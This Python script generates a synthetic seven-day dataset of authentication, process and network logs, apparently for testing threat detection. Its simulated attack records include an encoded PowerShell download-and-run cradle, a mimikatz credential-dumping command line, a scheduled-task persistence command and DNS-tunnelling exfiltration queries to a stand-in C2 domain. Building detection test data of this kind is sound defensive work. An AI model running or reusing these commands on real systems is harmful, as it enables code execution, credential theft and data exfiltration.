#!/usr/bin/env python3
"""
Infinity Veil Sample Data Generator
Generates a 7-day APT attack dataset with normal baseline traffic.
"""

import json
import random
from datetime import datetime, timedelta
from elasticsearch import Elasticsearch, helpers
import os
from dotenv import load_dotenv
# --- Configuration ---

load_dotenv()
ES_URL = os.getenv("ES_URL")
ES_API_KEY = os.getenv("ES_API_KEY")

es = Elasticsearch(ES_URL, api_key=ES_API_KEY)

# --- Constants ---
NORMAL_USERS = [
    "alice.johnson", "bob.smith", "carol.williams", "dave.brown",
    "eve.davis", "frank.wilson", "grace.moore", "henry.taylor",
    "iris.anderson", "jack.thomas"
]
ATTACKER_USER = "john.doe"  # Compromised IT admin account
NORMAL_HOSTS = [
    "WS-001", "WS-002", "WS-003", "WS-004", "WS-005",
    "WS-010", "WS-011", "WS-012", "WS-015", "WS-020"
]
ATTACK_HOSTS = ["WS-042", "WS-107", "SRV-003", "SRV-004", "FS-001", "DB-001"]
ALL_HOSTS = NORMAL_HOSTS + ATTACK_HOSTS
NORMAL_PROCESSES = [
    ("explorer.exe", "userinit.exe"),
    ("chrome.exe", "explorer.exe"),
    ("outlook.exe", "explorer.exe"),
    ("notepad.exe", "explorer.exe"),
    ("code.exe", "explorer.exe"),
    ("svchost.exe", "services.exe"),
    ("taskhostw.exe", "svchost.exe"),
]

BASE_DATE = datetime(2026, 2, 1, 0, 0, 0)


def generate_normal_auth_logs(day_offset, count=200):
    """Generate normal authentication events for a single day."""
    docs = []
    base = BASE_DATE + timedelta(days=day_offset)
    for _ in range(count):
        user = random.choice(NORMAL_USERS)
        host = random.choice(NORMAL_HOSTS)
        hour = random.choices(range(24), weights=[
            1,1,1,1,1,2,5,10,15,15,15,15,15,15,15,15,10,8,5,3,2,1,1,1
        ])[0]
        ts = base + timedelta(hours=hour, minutes=random.randint(0,59), seconds=random.randint(0,59))
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "event": {
                    "type": "authentication",
                    "outcome": "success",
                    "action": "logon",
                    "id": f"evt-{random.randint(100000,999999)}"
                },
                "user": {"name": user, "domain": "CORP"},
                "source": {
                    "ip": f"10.0.{random.randint(1,10)}.{random.randint(1,254)}",
                    "port": random.randint(49152, 65535)
                },
                "destination": {"host": host, "ip": f"10.0.20.{random.randint(1,254)}"},
                "authentication": {"method": "kerberos", "logon_type": "interactive"},
                "host": {"name": host, "os": "Windows 10"},
                "message": f"Successful logon for {user} on {host}"
            }
        })
    return docs


def generate_attack_auth_logs():
    """Generate the attacker's authentication events across 7 days."""
    docs = []

    # Day 1: Initial compromise - john.doe logs in normally, then suspicious activity
    day1 = BASE_DATE + timedelta(days=0)
    docs.append({
        "_index": "nightwatch-auth-logs",
        "_source": {
            "@timestamp": (day1 + timedelta(hours=9, minutes=14)).isoformat() + "Z",
            "event": {"type": "authentication", "outcome": "success", "action": "logon", "id": "evt-attack-001"},
            "user": {"name": ATTACKER_USER, "domain": "CORP"},
            "source": {"ip": "10.0.5.42", "port": 52341},
            "destination": {"host": "WS-042", "ip": "10.0.20.42"},
            "authentication": {"method": "kerberos", "logon_type": "interactive"},
            "host": {"name": "WS-042", "os": "Windows 10"},
            "message": f"Logon for {ATTACKER_USER} on WS-042 (normal daily login)"
        }
    })

    # Day 2: Lateral movement - RDP to multiple hosts in rapid succession
    day2 = BASE_DATE + timedelta(days=1)
    lateral_targets = ["WS-107", "SRV-003", "SRV-004"]
    for i, target in enumerate(lateral_targets):
        ts = day2 + timedelta(hours=11, minutes=30 + i*15)
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "event": {"type": "authentication", "outcome": "success", "action": "logon", "id": f"evt-attack-01{i}"},
                "user": {"name": ATTACKER_USER, "domain": "CORP"},
                "source": {"ip": "10.0.20.42", "port": random.randint(49152, 65535)},
                "destination": {"host": target, "ip": f"10.0.20.{100+i}"},
                "authentication": {"method": "ntlm", "logon_type": "remote_interactive"},
                "host": {"name": target, "os": "Windows Server 2019"},
                "message": f"Remote RDP logon for {ATTACKER_USER} from WS-042 to {target}"
            }
        })
    # Also add 2 failed attempts to other hosts
    for i in range(2):
        ts = day2 + timedelta(hours=11, minutes=20 + i*5)
        target = f"SRV-00{i+5}"
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "event": {"type": "authentication", "outcome": "failure", "action": "logon", "id": f"evt-attack-02{i}"},
                "user": {"name": ATTACKER_USER, "domain": "CORP"},
                "source": {"ip": "10.0.20.42"},
                "destination": {"host": target},
                "authentication": {"method": "ntlm", "logon_type": "remote_interactive"},
                "host": {"name": target, "os": "Windows Server 2019"},
                "message": f"Failed RDP logon attempt for {ATTACKER_USER} to {target}"
            }
        })

    # Day 4: Movement to file server and database with domain admin creds
    day4 = BASE_DATE + timedelta(days=3)
    for i, target in enumerate(["FS-001", "DB-001"]):
        ts = day4 + timedelta(hours=2, minutes=15 + i*10)
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "event": {"type": "authentication", "outcome": "success", "action": "logon", "id": f"evt-attack-04{i}"},
                "user": {"name": ATTACKER_USER, "domain": "CORP"},
                "source": {"ip": "10.0.20.107", "port": random.randint(49152, 65535)},
                "destination": {"host": target, "ip": f"10.0.30.{i+1}"},
                "authentication": {"method": "ntlm", "logon_type": "remote_interactive"},
                "host": {"name": target, "os": "Windows Server 2019"},
                "message": f"Remote logon for {ATTACKER_USER} from WS-107 to {target} using domain admin credentials"
            }
        })

    return docs


def generate_normal_process_logs(day_offset, count=150):
    """Generate normal process execution events."""
    docs = []
    base = BASE_DATE + timedelta(days=day_offset)
    for _ in range(count):
        proc, parent = random.choice(NORMAL_PROCESSES)
        host = random.choice(ALL_HOSTS)
        hour = random.choices(range(24), weights=[
            1,1,1,1,1,2,5,10,15,15,15,15,15,15,15,15,10,8,5,3,2,1,1,1
        ])[0]
        ts = base + timedelta(hours=hour, minutes=random.randint(0,59))
        docs.append({
            "_index": "nightwatch-process-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "host": {"name": host, "os": "Windows 10"},
                "process": {
                    "name": proc,
                    "executable": f"C:\\Windows\\System32\\{proc}" if "svc" in proc else f"C:\\Program Files\\{proc}",
                    "command_line": f"{proc}",
                    "pid": random.randint(1000, 65535),
                    "parent": {"name": parent, "pid": random.randint(100, 999)}
                },
                "user": {"name": random.choice(NORMAL_USERS), "domain": "CORP", "privilege_level": "standard"},
                "event": {"type": "process_start", "id": f"proc-{random.randint(100000,999999)}"},
                "message": f"Process started: {proc} by {parent}"
            }
        })
    return docs


def generate_attack_process_logs():
    """Generate the attacker's process execution events."""
    docs = []

    # Day 1: Malicious macro -> PowerShell
    day1 = BASE_DATE + timedelta(days=0)
    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": (day1 + timedelta(hours=9, minutes=15)).isoformat() + "Z",
            "host": {"name": "WS-042", "os": "Windows 10"},
            "process": {
                "name": "powershell.exe",
                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAHQAYQBnAGUAcgAnACkA",
                "pid": 7842,
                "parent": {"name": "winword.exe", "pid": 3456}
            },
            "user": {"name": ATTACKER_USER, "domain": "CORP", "privilege_level": "standard"},
            "event": {"type": "process_start", "id": "proc-attack-001"},
            "message": "SUSPICIOUS: powershell.exe spawned by winword.exe with encoded command"
        }
    })

    # Day 3: Credential dumping (mimikatz-like)
    day3 = BASE_DATE + timedelta(days=2)
    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": (day3 + timedelta(hours=14, minutes=2)).isoformat() + "Z",
            "host": {"name": "WS-107", "os": "Windows 10"},
            "process": {
                "name": "svchost_update.exe",
                "executable": "C:\\Windows\\Temp\\svchost_update.exe",
                "command_line": "svchost_update.exe privilege::debug sekurlsa::logonpasswords exit",
                "pid": 9102,
                "parent": {"name": "cmd.exe", "pid": 8844}
            },
            "user": {"name": ATTACKER_USER, "domain": "CORP", "privilege_level": "admin"},
            "event": {"type": "process_start", "id": "proc-attack-003"},
            "message": "SUSPICIOUS: Unknown binary with mimikatz-like command line arguments"
        }
    })

    # Day 7: Persistence via scheduled task
    day7 = BASE_DATE + timedelta(days=6)
    for host in ["WS-042", "WS-107"]:
        docs.append({
            "_index": "nightwatch-process-logs",
            "_source": {
                "@timestamp": (day7 + timedelta(hours=3, minutes=30)).isoformat() + "Z",
                "host": {"name": host, "os": "Windows 10"},
                "process": {
                    "name": "schtasks.exe",
                    "executable": "C:\\Windows\\System32\\schtasks.exe",
                    "command_line": f"schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Windows\\Temp\\update.exe\" /sc daily /st 03:00",
                    "pid": random.randint(5000, 9999),
                    "parent": {"name": "cmd.exe", "pid": random.randint(4000, 4999)}
                },
                "user": {"name": ATTACKER_USER, "domain": "CORP", "privilege_level": "admin"},
                "event": {"type": "process_start", "id": f"proc-attack-persist-{host}"},
                "message": f"Scheduled task created on {host} for persistence"
            }
        })

    return docs


def generate_normal_network_logs(day_offset, count=100):
    """Generate normal network traffic."""
    docs = []
    base = BASE_DATE + timedelta(days=day_offset)
    normal_domains = ["google.com", "microsoft.com", "github.com", "slack.com", "office365.com"]
    for _ in range(count):
        host = random.choice(ALL_HOSTS)
        ts = base + timedelta(hours=random.randint(6,20), minutes=random.randint(0,59))
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "source": {"ip": f"10.0.20.{random.randint(1,254)}", "port": random.randint(49152,65535), "host": host},
                "destination": {
                    "ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    "port": random.choice([80, 443]),
                    "domain": random.choice(normal_domains)
                },
                "network": {
                    "protocol": "https",
                    "bytes": random.randint(500, 50000),
                    "direction": "outbound"
                },
                "host": {"name": host},
                "event": {"type": "connection"},
                "message": f"Normal HTTPS traffic from {host}"
            }
        })
    return docs


def generate_attack_network_logs():
    """Generate the attacker's network activity."""
    docs = []

    # Day 5: Data staging - large internal transfers
    day5 = BASE_DATE + timedelta(days=4)
    for i in range(20):
        ts = day5 + timedelta(hours=2, minutes=i*3)
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "source": {"ip": "10.0.30.1", "port": random.randint(49152,65535), "host": "FS-001"},
                "destination": {"ip": "10.0.20.42", "port": 445, "host": "WS-042"},
                "network": {
                    "protocol": "smb",
                    "bytes": random.randint(100000000, 500000000),
                    "direction": "internal"
                },
                "host": {"name": "FS-001"},
                "event": {"type": "connection"},
                "message": "Large SMB transfer from FS-001 to WS-042"
            }
        })

    # Day 6: DNS tunneling exfiltration
    day6 = BASE_DATE + timedelta(days=5)
    for i in range(100):
        ts = day6 + timedelta(hours=3, minutes=random.randint(0,120), seconds=random.randint(0,59))
        # DNS tunneling uses long subdomain queries
        tunnel_query = ''.join(random.choices('abcdef0123456789', k=60)) + ".data.evil-c2-server.com"
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "source": {"ip": "10.0.30.1", "port": random.randint(49152,65535), "host": "FS-001"},
                "destination": {"ip": "203.0.113.42", "port": 53, "domain": "evil-c2-server.com"},
                "network": {"protocol": "dns", "bytes": random.randint(200, 500), "direction": "outbound"},
                "dns": {
                    "query": tunnel_query,
                    "query_type": "TXT",
                    "response_code": "NOERROR"
                },
                "host": {"name": "FS-001"},
                "event": {"type": "dns_query"},
                "message": "DNS query with unusually long subdomain"
            }
        })

    return docs


def generate_threat_intel():
    """Generate threat intelligence data and exception patterns."""
    docs = []

    # Known threat indicators
    threat_indicators = [
        {"type": "ip", "value": "203.0.113.42", "name": "APT-29 C2 Server", "severity": "critical", "technique": "T1071.004"},
        {"type": "domain", "value": "evil-c2-server.com", "name": "Known C2 Domain", "severity": "critical", "technique": "T1048.003"},
        {"type": "hash", "value": "a1b2c3d4e5f6...", "name": "Mimikatz Variant", "severity": "high", "technique": "T1003"},
        {"type": "process", "value": "svchost_update.exe", "name": "Renamed Mimikatz", "severity": "high", "technique": "T1036"},
    ]

    for ioc in threat_indicators:
        docs.append({
            "_index": "nightwatch-threat-intel",
            "_source": {
                "@timestamp": datetime.now().isoformat() + "Z",
                "ioc": {"type": ioc["type"], "value": ioc["value"]},
                "threat": {
                    "name": ioc["name"],
                    "category": "apt",
                    "severity": ioc["severity"],
                    "description": f"Known indicator: {ioc['name']}",
                    "mitre_technique": ioc["technique"]
                },
                "source": "NIGHTWATCH-ThreatFeed"
            }
        })

    # Exception patterns (known benign patterns for ADVOCATE)
    exception_patterns = [
        {
            "pattern_type": "it_admin_patching",
            "description": "IT admins perform monthly patch deployment via RDP on the first Tuesday of each month between 22:00-06:00.",
            "esql_exclusion": "user.name IN ('admin.patching', 'svc_sccm') AND authentication.logon_type == 'remote_interactive'",
            "active": True
        },
        {
            "pattern_type": "backup_service",
            "description": "Backup service account performs nightly SMB transfers between FS-001 and BACKUP-SRV.",
            "esql_exclusion": "user.name == 'svc_backup' AND destination.host == 'BACKUP-SRV'",
            "active": True
        }
    ]

    for pattern in exception_patterns:
        docs.append({
            "_index": "nightwatch-threat-intel",
            "_source": {
                "@timestamp": datetime.now().isoformat() + "Z",
                "exception_pattern": pattern,
                "source": "NIGHTWATCH-ExceptionDB"
            }
        })

    return docs


def main():
    print("Generating NIGHTWATCH sample data...")

    all_docs = []

    # Generate 7 days of normal + attack data
    for day in range(7):
        all_docs.extend(generate_normal_auth_logs(day, count=200))
        all_docs.extend(generate_normal_process_logs(day, count=150))
        all_docs.extend(generate_normal_network_logs(day, count=100))

    # Add attack data
    all_docs.extend(generate_attack_auth_logs())
    all_docs.extend(generate_attack_process_logs())
    all_docs.extend(generate_attack_network_logs())

    # Add threat intelligence
    all_docs.extend(generate_threat_intel())

    print(f"Generated {len(all_docs)} documents. Indexing...")

    # Bulk index
    success, errors = helpers.bulk(es, all_docs, stats_only=True)
    print(f"Indexed {success} documents. Errors: {errors}")

    # Verify counts
    for index in ["nightwatch-auth-logs", "nightwatch-process-logs",
                   "nightwatch-network-logs", "nightwatch-threat-intel"]:
        count = es.count(index=index)["count"]
        print(f"  {index}: {count} documents")


if __name__ == "__main__":
    main()